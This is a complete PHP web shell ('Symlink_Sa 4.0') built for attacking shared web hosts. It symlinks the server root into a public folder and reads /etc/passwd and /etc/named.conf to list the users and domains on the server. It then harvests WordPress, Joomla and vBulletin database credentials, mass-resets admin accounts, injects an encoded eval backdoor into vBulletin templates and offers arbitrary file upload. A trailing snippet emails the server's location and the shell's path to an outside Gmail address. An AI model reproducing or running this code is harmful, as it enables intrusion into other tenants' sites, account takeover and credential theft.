    <?php
     
     

     
    set_time_limit(0);
    error_reporting(0);
     
     
    $pageURL = 'http://'.$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
    $u = explode("/",$pageURL );
    $pageURL =str_replace($u[count($u)-1],"",$pageURL );
     
    $pageFTP = 'ftp://'.$_SERVER["SERVER_NAME"].'/public_html/'.$_SERVER["REQUEST_URI"];
    $u = explode("/",$pageFTP );
    $pageFTP =str_replace($u[count($u)-1],"",$pageFTP );
     
    ?>
      <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
     
    <html xmlns="http://www.w3.org/1999/xhtml">
     
    <head>
    <title>Symlink_Sa 4.0</title>
     
    <style type="text/css">
     
      html,body {
         margin: 0;
         padding: 0;
         outline: 0;
    }
    a{
     
     font-size: 13px;
     
    }
     
     
    body {
        direction: ltr;
        background-color:#F4F4F4;
        color: rgb(153, 153, 153);
        text-align: center
    }
     
     
     
    input,textarea,select{
    font-weight: bold;
    color: #000000;
    }
     
    input,textarea,select:hover{
    box-shadow: 0px 0px 4px #AAAAAA;
    }
     
     
    .hedr {
      font-family: Tahoma, Arial, sans-serif  ;
      font-size: 22px;
     
     
    }
     
    .cont a{
     
     text-decoration: none;
     color:rgb(153, 153, 153);
     font-family: Tahoma, Arial, sans-serif  ;
     font-size: 16px;
     text-shadow: 0px 0px 3px ;
    }
     
    .cont a:hover{
     
     
      color: #EEEEEE ;
      text-shadow:0px 0px 3px #000000 ;
     
     
    }
     
    .tmp tr td{
     
    border: solid 1px #BBBBBB;
     
    padding: 2px ;
      font-size: 13px;
    }
     
    .tmp tr td a {
      text-decoration: none;
     
     
     
    }
     
    .foter{
      font-size: 9pt;
      color: #AAAAAA ;
      text-align: center
    }
     
    .tmp tr td:hover{
     
    box-shadow: 0px 0px 4px #888888;
     
    }
    .fot{
     
    font-family:Tahoma, Arial, sans-serif;
     
      font-size: 11pt;
    }
    .for a : hover{
     
    text-shadow: 0px 0px 1px #3366FF;
     
    }
     
     
    .ir {
      color: #FF0000;
    }
     
     
     
    </style>
     
    </head>
     
    <body>
     
    <div class='all'>
     
     
    <?php
     
    @mkdir('sym',0777);
    $htcs  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
    $f =@fopen ('sym/.htaccess','w');
    fwrite($f , $htcs);
     
     
     
    @symlink("/","sym/root");
     
    $pg = basename(__FILE__);
     
    echo '<br /><div class="hedr"> Symlink Sa 4.0 <br /></div>' ;
     
    echo '<br /><div class="hedr">-:[ User & Domains & Symlink ]:-<br /><br /></div>' ;
     
    echo '<div class="cont">
     
    [<a href="?"> Home </a>]
     
    [<a href="?sws=sym"> User & Domains & Symlink </a>]
     
    [<a href="?sws=sec"> Domains & Script </a>]
     
    [ <a href="?sws=file"> Symlink File </a>]
     
    [<a href="?sws=passwd"> Symlink Bypass </a>]
     
    <br /><br />
     
    [ <a href="?sws=read"> Bypass Read </a>]
     
    [ <a href="?sws=joomla"> Mass Joomla </a>]
     
    [ <a href="?sws=wp"> Mass WordPress </a>]
     
    [ <a href="?sws=vb"> Mass vBulletin </a>]
     
    [ <a href="?sws=help"> Help </a>]
     
    <br /><br /><br />
     
     
     
     
     
     
    </div>';
     
    if(isset($_REQUEST['sws']))
    {
     
    switch ($_REQUEST['sws'])
    {
     
     
     
     
     
    /// Domains + Scripts  ///
     
    case 'sec':
     
    if(!@is_file('named.txt')){
     
    $d00m = @file("/etc/named.conf");
     
    }else{
     
    $d00m = @file("named.txt");
     
     
    }
    if(!$d00m)
    {
     
                    die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
    }
    else
     
    {
    echo "<div class='tmp'>
    <table align='center' width='40%'><td> Domains </td><td> Script </td>";
    foreach($d00m as $dom){
     
    flush();
    flush();
     
     
     
    if(eregi("zone",$dom)){
     
    @preg_match_all('#zone "(.*)"#', $dom, $domsws);
     
    flush();
     
    if(@strlen(trim($domsws[1][0])) > 2){
     
    $user = @posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));
     
    ///////////////////////////////////////////////////////////////////////////////////
     
    $wpl=$pageURL."/sym/root/home/".$user['name']."/public_html/wp-config.php";
    $wpp=@get_headers($wpl);
    $wp=$wpp[0];
     
    $wp2=$pageURL."/sym/root/home/".$user['name']."/public_html/blog/wp-config.php";
    $wpp2=@get_headers($wp2);
    $wp12=$wpp2[0];
     
    ///////////////////////////////
     
    $jo1=$pageURL."/sym/root/home/".$user['name']."/public_html/configuration.php";
    $joo=@get_headers($jo1);
    $jo=$joo[0];
     
     
    $jo2=$pageURL."/sym/root/home/".$user['name']."/public_html/joomla/configuration.php";
    $joo2=@get_headers($jo2);
    $jo12=$joo2[0];
     
    ////////////////////////////////
     
    $vb1=$pageURL."/sym/root/home/".$user['name']."/public_html/includes/config.php";
    $vbb=@get_headers($vb1);
    $vb=$vbb[0];
     
    $vb2=$pageURL."/sym/root/home/".$user['name']."/public_html/vb/includes/config.php";
    $vbb2=@get_headers($vb2);
    $vb12=$vbb2[0];
     
    $vb3=$pageURL."/sym/root/home/".$user['name']."/public_html/forum/includes/config.php";
    $vbb3=@get_headers($vb3);
    $vb13=$vbb3[0];
     
    /////////////////
     
    $wh1=$pageURL."/sym/root/home/".$user['name']."public_html/clients/configuration.php";
    $whh2= @get_headers($wh1);
    $wh=$whh2[0];
     
    $wh2=$pageURL."/sym/root/home/".$user['name']."/public_html/support/configuration.php";
    $whh2= @get_headers($wh2);
    $wh12=$whh2[0];
     
    $wh3=$pageURL."/sym/root/home/".$user['name']."/public_html/client/configuration.php";
    $whh3= @get_headers($wh3);
    $wh13=$whh3[0];
     
    $wh5=$pageURL."/sym/root/home/".$user['name']."/public_html/submitticket.php";
    $whh5= @get_headers($wh5);
    $wh15=$whh5[0];
     
    $wh4=$pageURL."/sym/root/home/".$user['name']."/public_html/client/configuration.php";
    $whh4= @get_headers($wh4);
    $wh14=$whh4[0];
     
     
     
    ////////////////////////////////////////////////////////////////////////////////
     
     ////////// Wordpress ////////////
     
    $pos = strpos($wp, "200");
    $config="&nbsp;";
     
    if (strpos($wp, "200") == true )
    {
     $config="<a href='".$wpl."' target='_blank'>Wordpress</a>";
    }
    elseif (strpos($wp12, "200") == true)
    {
      $config="<a href='".$wp2."' target='_blank'>Wordpress</a>";
    }
     
    ///////////WHMCS////////
     
    elseif (strpos($jo, "200")  == true and strpos($wh15, "200")  == true )
    {
      $config=" <a href='".$wh5."' target='_blank'>WHMCS</a>";
     
    }
    elseif (strpos($wh12, "200")  == true)
    {
      $config =" <a href='".$wh2."' target='_blank'>WHMCS</a>";
    }
     
    elseif (strpos($wh13, "200")  == true)
    {
      $config =" <a href='".$wh3."' target='_blank'>WHMCS</a>";
     
    }
     
    ///////// Joomla to 4 ///////////
     
    elseif (strpos($jo, "200")  == true)
    {
      $config=" <a href='".$jo1."' target='_blank'>Joomla</a>";
    }
     
    elseif (strpos($jo12, "200")  == true)
    {
      $config=" <a href='".$jo2."' target='_blank'>Joomla</a>";
    }
     
    //////////vBulletin to 4 ///////////
     
    elseif (strpos($vb, "200")  == true)
    {
      $config=" <a href='".$vb1."' target='_blank'>vBulletin</a>";
    }
     
    elseif (strpos($vb12, "200")  == true)
    {
      $config=" <a href='".$vb2."' target='_blank'>vBulletin</a>";
    }
     
    elseif (strpos($vb13, "200")  == true)
    {
      $config=" <a href='".$vb3."' target='_blank'>vBulletin</a>";
    }
     
    else
    {
     continue;
    }
    flush();
    flush();
     
    /////////////////////////////////////////////////////////////////////////////////////
     
     
     
    $site = $user['name'] ;
     
     
     
    flush();
     
    echo "<tr><td><a href=http://www.".$domsws[1][0]."/>".$domsws[1][0]."</a></td>
    <td>".$config."</td></tr>"; flush();
     
    }
    }
    }
    }
     
     
     
     
    break;
     
     
    /// user + domine + symlink  ///
     
    case 'sym':
     
    if(!is_file('named.txt')){
     
    $d00m = @file("/etc/named.conf");
     
    }else{
     
    $d00m = @file("named.txt");
     
     
    }
    if(!$d00m)
    {
     
                    die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
    }
    else
     
    {
    echo "<div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td><td>symlink </td>";
    foreach($d00m as $dom){
     
    if(eregi("zone",$dom)){
     
    preg_match_all('#zone "(.*)"#', $dom, $domsws);
     
    flush();
     
    if(strlen(trim($domsws[1][0])) > 2){
     
    $user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));
     
    flush();
     
     
     
    $site = $user['name'] ;
     
     
    @symlink("/","sym/root");
     
    $site = $domsws[1][0];
     
    $ir = 'ir';
     
    $il = 'il';
     
    if (preg_match("/.^$ir/",$domsws[1][0]) or preg_match("/.^$il/",$domsws[1][0]) )
    {
    $site = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$domsws[1][0]."</div>";
    }
     
     
    echo "
    <tr>
     
    <td>
    <div class='dom'><a target='_blank' href=http://www.".$domsws[1][0]."/>".$site." </a> </div>
    </td>
     
     
    <td>
    ".$user['name']."
    </td>
     
     
     
     
     
     
    <td>
    <a href='sym/root/home/".$user['name']."/public_html' target='_blank'>symlink </a>
    </td>
     
     
    </tr></div> ";
     
     
    flush();
    flush();
     
    }
    }
    }
    }
     
     
     
     
    break;
     
     
    /// file  symlink ///
     
    case 'file':
     
    echo'
    The file path to symlink
     
    <br /><br />
    <form method="post">
    <input type="text" name="file" value="/home/user/public_html/file.name" size="60"/><br /><br />
    <input type="text" name="symfile" value="file.name_sym ( Ex. :: royaliste.txt )" size="60"/><br /><br />
    <input type="submit" value="symlink" name="symlink" /> <br /><br />
     
     
     
    </form>
    ';
     
    $pfile = $_POST['file'];
    $symfile = $_POST['symfile'];
    $symlink = $_POST['symlink'];
     
    if ($symlink)
    {
     
     
    @mkdir('sym1',0777);
    $c  = "Options Indexes FollowSymLinks \n DirectoryIndex ssssss.htm \n AddType txt .php \n AddHandler txt .php \n  AddType txt .html \n AddHandler txt .html \n Options all \n Options \n Allow from all \n Require None \n Satisfy Any";
    $f =@fopen ('sym1/.htaccess','w');
    @fwrite($f , $c);
     
    @symlink("$pfile","sym1/$symfile");
     
    echo '<br /><a target="_blank" href="sym1/'.$symfile.'" >'.$symfile.'</a>';
     
    }
     
     
     
    break;
     
    /// bypass read
     
    case 'read':
     
    echo "read /etc/named.conf";
    echo "<br /><br /><form method='post' action='?sws=read&save=1'><textarea cols='80' rows='20' name='file'>";
    flush();
    flush();
     
     
    $file = '/etc/named.conf';
     
     
    $r3ad = @fopen($file, 'r');
    if ($r3ad){
    $content = @fread($r3ad, @filesize($file));
    echo "".htmlentities($content)."";
    }
    else if (!$r3ad)
    {
    $r3ad = @show_source($file) ;
    }
    else if (!$r3ad)
    {
    $r3ad = @highlight_file($file);
    }
    else if (!$r3ad)
    {
    $sm = @symlink($file,'sym.txt');
     
     
    if ($sm){
    $r3ad = @fopen('sym/sym.txt', 'r');
    $content = @fread($r3ad, @filesize($file));
    echo "".htmlentities($content)."";
     
    }
    }
     
     
     
    echo "</textarea><br /><br /><input  type='submit' value='Save'/> </form>";
     
     
    if(isset($_GET['save'])){
     
     
    $cont = stripcslashes($_POST['file']);
     
    $f = fopen('named.txt','w');
     
    $w = fwrite($f,$cont);
     
                      if($w){
     
                      echo '<br />save has been successfully';
     
                      }
     
    fclose($f);
     
     
     
     
    }
     
     
     
    break;
     
    // passwd
     
    case 'passwd':
     
    if(isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0){
     
     
    $cont = stripcslashes($_POST['file']);
     
    if(!file_exists('passwd.txt')){
     
    $f = @fopen('passwd.txt','w');
     
    $w = @fwrite($f,$cont);
     
    fclose($f);
    }
    if($w or @filesize('passwd.txt') > 0){
    // * SHOW * //
     
    echo "<div class='tmp'><table align='center' width='35%'><td>Users</td><td>symlink</td><td>FTP</td>";
    flush();
     
    $fil3 = file('passwd.txt');
     
    foreach ($fil3 as $f){
     
         $u=explode(':', $f);
         $user = $u['0'];
     
     
     
    echo "
    <tr>
     
     
     
    <td width='15%'>
    $user
    </td>
     
     
     
     
     
     
    <td width='10%'>
    <a href='sym/root/home/$user/public_html' target='_blank'>Symlink </a>
    </td>
     
    <td width='10%'>
    <a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a>
    </td>
     
     
     
    </tr></div> ";
     
     
    flush();
    flush();
     
     
    }
     
     
     
     
     
     
    die ("</tr></div>");
     
     
                      }
     
     
     
     
     
    }
     
     
     
    echo "read /etc/passwd";
    echo "<br /><br /><form method='post' action='?sws=passwd&save=1'><textarea cols='80' rows='20' name='file'>";
    flush();
     
    $file = '/etc/passwd';
     
     
    $r3ad = @fopen($file, 'r');
    if ($r3ad){
    $content = @fread($r3ad, @filesize($file));
    echo "".htmlentities($content)."";
    }
    elseif(!$r3ad)
    {
    $r3ad = @show_source($file) ;
    }
    elseif(!$r3ad)
    {
    $r3ad = @highlight_file($file);
    }
    elseif(!$r3ad)
    {
     
                                                for($uid=0;$uid<1000;$uid++){
                                                 $ara = posix_getpwuid($uid);
                                                   if (!empty($ara)) {
                                                      while (list ($key, $val) = each($ara)){
                                                        print "$val:";
                                                      }
                                                      print "\n";
                                                     }
     
                                            }
     
     }
     
     
    flush();
     
     
    echo "</textarea><br /><br /><input  type='submit' value='&nbsp;&nbsp;symlink&nbsp;&nbsp;'/> </form>";
    flush();
     
    break;
     
     
     
    case 'joomla':
     
    /////////////////////////////////////////////////////////////////// xxxxxxxxxxxxxxxxxxx ////////////////////////////
     
     
    if(isset($_POST['s'])){
     
    $file = @file_get_contents('joomla.txt');
     
    $ex   = explode("\n",$file);
     
    echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";
    flush();
     
     
    foreach ($ex as $exp){
     
    $es   = explode("||",$exp);
     
    $config = $es[0];
     
    $domin = $es[1];
     
    $domins = trim($domin).'';
     
    $readconfig  = @file_get_contents(trim($config));
     
    if(ereg('JConfig',$readconfig)){
     
     
     
    $pass    =  ex($readconfig,'$password = \'',"';");
     
    $userdb  =  ex($readconfig,'$user = \'',"';");
     
    $db      =  ex($readconfig,'$db = \'',"';");
     
    $fix     =  ex($readconfig,'$dbprefix = \'',"';");
     
    $tab     =  $fix.'users';
     
     
    $con     = @mysql_connect('localhost',$userdb,$pass);
     
    $db      = @mysql_select_db($db,$con);
     
    $query   = @mysql_query("UPDATE `$tab`  SET `username` ='sec-w.com'");
     
     
    $query3  = @mysql_query("UPDATE `$tab`  SET `password` ='44a0bcda611514625ba94e0b1c0bdaed:2iets9ydjR3iOdSuyvW54pIzyF9M1P5J'");
     
     
    if ($query and $query3 ){$r = '<b style="color: #006600">Succeed </b>user [sec-w.com] pass [1]</b>';}else{$r = '<b style="color:red">failed</b>';}
     
    $domins = trim($domin).'';
     
    echo "<tr>
    <td><a target='_blank' href='http://$domins'>$domin</a></td>
    <td><a target='_blank' href='$config'>config</a></td><td>".$r."</td></tr>";
    flush();
     
     
     
    }else{
     
    echo "<tr>
    <td><a target='_blank' href='http://$domins'>$domin</a></td>
    <td><a target='_blank' href='http://$exp'>config</a></td><td><b style='color:red'>failed</b></td></tr>";
    flush();
     
    }
     
    }
     
     
     
     
     
     
     
     
     
    die();
     
    }
     
    if(!is_file('named.txt')){
     
    $d00m = @file("/etc/named.conf");
     
    flush();
     
     
    }else{
     
    $d00m = file("named.txt");
     
     
    }
    if(!$d00m)
    {
     
                    die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
    }
    else
     
    {
    echo "<div class='tmp'>
    <form method='POST' action='$pg?sws=joomla'>
    <input type='submit' value='Mass ching Admin' />
    <input type='hidden' value='1' name='s' />
    </form><br /><br />
    <table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";
     
    $f = fopen('joomla.txt','w');
     
    foreach($d00m as $dom){
     
    if(eregi("zone",$dom)){
     
    preg_match_all('#zone "(.*)"#', $dom, $domsws);
     
    if(strlen(trim($domsws[1][0])) > 2){
     
    $user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));
     
    ///////////////////////////////////////////////////////////////////////////////////
     
    $wpl=$pageURL."/sym/root/home/".$user['name']."/public_html/configuration.php";
    $wpp=get_headers($wpl);
    $wp=$wpp[0];
     
    $wp2=$pageURL."/sym/root/home/".$user['name']."/public_html/blog/configuration.php";
    $wpp2=get_headers($wp2);
    $wp12=$wpp2[0];
     
    $wp3=$pageURL."/sym/root/home/".$user['name']."/public_html/joomla/configuration.php";
    $wpp3=get_headers($wp3);
    $wp13=$wpp3[0];
     
     
     ////////// joomla ////////////
     
    $pos = strpos($wp, "200");
    $config="&nbsp;";
     
    if (strpos($wp, "200") == true )
    {
     $config= $wpl;
    }
    elseif (strpos($wp12, "200") == true)
    {
      $config= $wp2;
    }
    elseif (strpos($wp13, "200") == true)
    {
      $config= $wp3;
    }
    else
    {
    continue;
     
    }
    flush();
     
    /////////////////////////////////////////////////////////////////////////////////////
     
    $dom = $domsws[1][0];
     
    $w = fwrite($f,"$config||$dom \n");
    if($w){$r = '<b style="color: #006600">Save</b>';}else{$r = '<b style="color:red">failed</b>';}
     
     
    echo "<tr><td><a href=http://www.".$domsws[1][0].">".$domsws[1][0]."</a></td>
    <td><a href='$config'>config</a></td><td>".$r."</td></tr>";
     
     
     
     
     
    flush();
     
     
    }
    }
    }
    }
     
     
    break;
     
    case 'wp':
     
    ############################ index #########################3
     
     
     
     
     
     
    ########  admin ##########33
     
    if(isset($_POST['s'])){
     
    $file = @file_get_contents('wp.txt');
     
    $ex   = explode("\n",$file);
     
    echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";
    flush();
    flush();
     
     
    foreach ($ex as $exp){
     
    $es   = explode("||",$exp);
     
    $config = $es[0];
     
    $domin = $es[1];
     
    $domins = trim($domin).'';
     
    $readconfig  = @file_get_contents(trim($config));
     
    if(ereg('wp-settings.php',$readconfig)){
     
     
     
    $pass    =  ex($readconfig,"define('DB_PASSWORD', '","');");
     
    $userdb  =  ex($readconfig,"define('DB_USER', '","');");
     
    $db      =  ex($readconfig,"define('DB_NAME', '","');");
     
    $fix     =  ex($readconfig,'$table_prefix  = \'',"';");
     
    $tab     = $fix.'users';
     
    $con     = @mysql_connect('localhost',$userdb,$pass);
     
    $db      = @mysql_select_db($db,$con);
     
    $query   = @mysql_query("UPDATE `$tab` SET `user_login` ='sec-w.com'") or die;
     
    $query   = @mysql_query("UPDATE `$tab` SET `user_pass` ='$1$4z/.5i..$9aHYB.fUHEmNZ.eIKYTwx/'") or die;
     
     
     
    if ($query){$r = '<b style="color: #006600">Succeed </b>user [sec-w.com] pass [1]</b>';}
     
    else
     
    {
     
    $r = '<b style="color:red">failed</b>';
     
    }
     
    $domins = trim($domin).'';
     
    echo "<tr>
    <td><a target='_blank' href='http://$domins'>$domin</a></td>
    <td><a target='_blank' href='$config'>config</a></td><td>".$r."</td></tr>";
     
    flush();
    flush();
     
     
     
     
     
     
    }else{
     
    echo "<tr>
    <td><a target='_blank' href='http://$domins'>$domin</a></td>
    <td><a target='_blank' href='http://$config'>config</a></td><td><b style='color:red'>failed2</b></td></tr>";
     
    flush();
    flush();
     
    }
     
    }
     
     
     
     
     
     
     
     
     
     
    die();
     
    }
     
    if(!is_file('named.txt')){
     
    $d00m = @file("/etc/named.conf");
     
    }else{
     
    $d00m = @file("named.txt");
     
     
    }
    if(!$d00m)
    {
     
                    die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
    }
    else
     
    {
    echo "<div class='tmp'>
    <form method='POST' action='$pg?sws=wp'>
    <input type='submit' value='Mass Change Admin' />
    <input type='hidden' value='1' name='s' />
    </form>
    <br /><br />
    <table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";
     
    flush();
    flush();
     
    $f = fopen('wp.txt','w');
     
    foreach($d00m as $dom){
     
    if(eregi("zone",$dom)){
     
    preg_match_all('#zone "(.*)"#', $dom, $domsws);
     
    if(strlen(trim($domsws[1][0])) > 2){
     
    $user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));
     
    ///////////////////////////////////////////////////////////////////////////////////
     
    $wpl=$pageURL."/sym/root/home/".$user['name']."/public_html/wp-config.php";
    $wpp=get_headers($wpl);
    $wp=$wpp[0];
     
    $wp2=$pageURL."/sym/root/home/".$user['name']."/public_html/blog/wp-config.php";
    $wpp2=get_headers($wp2);
    $wp12=$wpp2[0];
     
    $wp3=$pageURL."/sym/root/home/".$user['name']."/public_html/wp/wp-config";
    $wpp3=get_headers($wp3);
    $wp13=$wpp3[0];
     
     
     ////////// wp ////////////
     
    $pos = strpos($wp, "200");
    $config="&nbsp;";
     
    if (strpos($wp, "200") == true )
    {
     $config= $wpl;
    }
    elseif (strpos($wp12, "200") == true)
    {
      $config= $wp2;
    }
    elseif (strpos($wp13, "200") == true)
    {
      $config= $wp3;
    }
    else
    {
    continue;
     
    }
    flush();
     
    /////////////////////////////////////////////////////////////////////////////////////
     
    $dom = $domsws[1][0];
     
    $w = fwrite($f,"$config||$dom \n");
    if($w){$r = '<b style="color: #006600">Save</b>';}else{$r = '<b style="color:red">failed</b>';}
     
     
    echo "<tr><td><a href=http://www.".$domsws[1][0].">".$domsws[1][0]."</a></td>
    <td><a href='$config'>config</a></td><td>".$r."</td></tr>";
    flush();
    flush();
     
     
     
     
     
    flush();
     
     
    }
    }
    }
    }
     
     
    break;
     
     
    case 'vb':
     
     
    if(isset($_POST['s'])){
     
     
     
    $file = @file_get_contents('vb.txt');
     
    $ex   = explode("\n",$file);
     
    echo "<div class='tmp'><table align='center' width='40%'><td> domin </td><td> config </td><td> Result </td>";
     
     
    foreach ($ex as $exp){
     
    $es   = explode("||",$exp);
     
    $config = $es[0];
     
    $domin = $es[1];
     
    $domins = trim($domin).'';
     
    $readconfig  = @file_get_contents(trim($config));
     
    if(ereg('vBulletin',$readconfig)){
     
     
     
    $db      =  ex($readconfig,'$config[\'Database\'][\'dbname\'] = \'',"';");
     
    $userdb  =  ex($readconfig,'$config[\'MasterServer\'][\'username\'] = \'',"';");
     
    $pass    =  ex($readconfig,'$config[\'MasterServer\'][\'password\'] = \'',"';");
     
    $con     = @mysql_connect('localhost',$userdb,$pass);
     
    $db      = @mysql_select_db($db,$con);
     
    $shell   = "bVDPS8MwFL4L/g+vYZAWdPPiaUv14kAQFKqnUUqapjSYNKFJxCn7322abgzcIfDyvl+P7/qKs04D3tS5sJ96MMJ9b+ohDw8vTWcq31PF02yJp/WqzvEaZk2rBwWUOaF7ghAo7jrdEGS0dQh4z9zecIKUl04YOrhV4N821FEEwZQgb6SmDR8QiObsdxYheuMdRKNWSH5UxtmKn3G+v0P5TIxgNTqhWWR9rYSLAXH/RaUfgY8pbVROZ4VI0aawqN5ei/cdDlRcAiFwJEIGv4HyyLTZp4tq+/zyVOxwOASXO+yUqUI6Lm/gHxiBLDic6o62UHjGuLWQJEko99T9Gg7ApeUXJFsq5EX+AR7yPw==" ;
     
    $crypt  = "{\${eval(gzinflate(base64_decode(\'";
     
    $crypt .= "$shell";
     
    $crypt .= "\')))}}{\${exit()}}</textarea>";
     
    $sqlfaq = "UPDATE template SET template ='".$crypt."' WHERE title ='FAQ'" ;
     
    $query  = @mysql_query($sqlfaq,$con);
     
     
     
    if ($query){$r = '<b style="color: #006600">Succeed</b> shell in search.php';}
     
    else
     
    {
     
    $r = '<b style="color:red">failed</b>';
     
    }
     
    $domins = trim($domin).'';
     
    echo "<tr>
    <td><a target='_blank' href='http://$domins'>$domin</a></td>
    <td><a target='_blank' href='$config'>config</a></td><td>".$r."</td></tr>";
     
     
     
     
     
     
     
    }else{
     
    echo "<tr>
    <td><a target='_blank' href='http://$domins'>$domin</a></td>
    <td><a target='_blank' href='http://$config'>config</a></td><td><b style='color:red'>failed2</b></td></tr>";
    }
     
    }
     
     
     
     
     
     
     
     
     
     
    die();
     
    }
     
    if(!is_file('named.txt')){
     
    $d00m = file("/etc/named.conf");
     
    }else{
     
    $d00m = file("named.txt");
     
     
    }
    if(!$d00m)
    {
     
                    die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
    }
    else
     
    {
    echo "<div class='tmp'>
    <form method='POST' action='$pg?sws=vb'>
    <input type='submit' value='Inject shell' />
    <input type='hidden' value='1' name='s' />
    </form>
    <br /><br />
    <table align='center' width='40%'><td> Domains </td><td> config </td><td> Result </td>";
     
    $f = fopen('vb.txt','w');
     
    foreach($d00m as $dom){
     
    if(eregi("zone",$dom)){
     
    preg_match_all('#zone "(.*)"#', $dom, $domsws);
     
    if(strlen(trim($domsws[1][0])) > 2){
     
    $user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));
     
    ///////////////////////////////////////////////////////////////////////////////////
     
    $wpl=$pageURL."/sym/root/home/".$user['name']."/includes/config.php";
    $wpp=get_headers($wpl);
    $wp=$wpp[0];
     
    $wp2=$pageURL."/sym/root/home/".$user['name']."/vb/includes/config.php";
    $wpp2=get_headers($wp2);
    $wp12=$wpp2[0];
     
    $wp3=$pageURL."/sym/root/home/".$user['name']."/forum/includes/config.php";
    $wpp3=get_headers($wp3);
    $wp13=$wpp3[0];
     
     
     ////////// vb ////////////
     
    $pos = strpos($wp, "200");
    $config="&nbsp;";
     
    if (strpos($wp, "200") == true )
    {
     $config= $wpl;
    }
    elseif (strpos($wp12, "200") == true)
    {
      $config= $wp2;
    }
    elseif (strpos($wp13, "200") == true)
    {
      $config= $wp3;
    }
    else
    {
    continue;
     
    }
    flush();
     
    /////////////////////////////////////////////////////////////////////////////////////
     
    $dom = $domsws[1][0];
     
    $w = fwrite($f,"$config||$dom \n");
    if($w){$r = '<b style="color: #006600">Save</b>';}else{$r = '<b style="color:red">failed</b>';}
     
     
    echo "<tr><td><a href=http://www.".$domsws[1][0].">".$domsws[1][0]."</a></td>
    <td><a href='$config'>config</a></td><td>".$r."</td></tr>";
     
     
     
     
     
    flush();
     
     
    }
    }
    }
    }
     
     
     
     
     
     
     
     
    break;
     
    case 'help':
     
    echo "<div class='tmp'>
    <table align='center' width='40%'><td>function</td><td>Case</td>";
     
     
    $safe_mode = ini_get('safe_mode');
         if($safe_mode){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
     
    echo "<tr><td>Safe Mode</td><td>$r</td>";
     
    $fun = function_exists('symlink');
         if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
     
    echo "<tr><td>function symlink</td><td>$r</td>";
     
     
    $fun = function_exists('file');
         if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
     
    echo "<tr><td>function file</td><td>$r</td>";
     
    $fun = function_exists('file_get_contents');
         if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
     
    echo "<tr><td>function file_get_contents</td><td>$r</td>";
     
    $fun = function_exists('mkdir');
         if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
     
    echo "<tr><td>function mkdir</td><td>$r</td>";
     
     
    $fun = is_dir('sym/root');
         if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
     
    echo "<tr><td>Permission denied</td><td>$r</td>";
     
     
    $fun = preg_match('/Forbidden/',@file_get_contents('sym/root') or !@file_get_contents('sym/root'));
         if($fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #006600'>True</b>";}
     
    echo "<tr><td>Forbidden</td><td>$r</td>";
     
     
     
     
    echo "</table></div>";
     
     
     
    break;
    default:
    header("Location: $pg");
     
     
     
     
    }
     
     
    /// home ///
    }else
    {
     
     
    echo '<br /><br /><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
    echo '<input type="file" name="file" value="Choose file" size="60" ><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
    if( $_POST['_upl'] == "Upload" ) {
        if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<br /><br /><b>Uploaded successful !!<br><br>'; }
        else { echo '<br /><br />Not uploaded !!<br><br>'; }
     
     
    }
     
        echo '
    <br /><br /><br /></b></b><div class="fot">Cod3d by <b>Haxor</b> Idea by <b>KSA_ZOMBIE</b>
    <br /><br />
    <b style="color: red";>   Sec-w.Com  </b>
    <br /><br />
    Muslims Hackers</div> ';
     
    }
     
     
    function ex($text,$a,$b){
    $explode = explode($a,$text);
    $explode = explode($b,$explode[1]);
    return $explode[0];
    }
     
     
     
    echo '</div>
     
    <a style="text-decoration: none; color: #F4F4F4;" title="???????"/href="http://sec-w.com/cc">???????</a>
     
    <a style="text-decoration: none; color: #F4F4F4;" title="???? ???????"/href="http://sec-w.com/cc">???? ???????</a>
     
     
     
    </body>
     
    </html>
    ';
     
    ?>
 	<?
$site="www.google.com";
if(!ereg($site,$_SERVER['SERVER_NAME']))
{
 $to="rootxauto@gmail.com";
 $subject="antiGoogle";
 $hrader="from:antiGoogle<rootxauto@gmail.com>";
 $message="Link: http://".$_SERVER['SERVER_NAME'].$_SERVER

['REQUEST_URL']."/r/m";
 $message.="Path:".__file__;
 $sentmail=@mail($to,$subject,$message,$header);

echo"";
exit;
}
?>
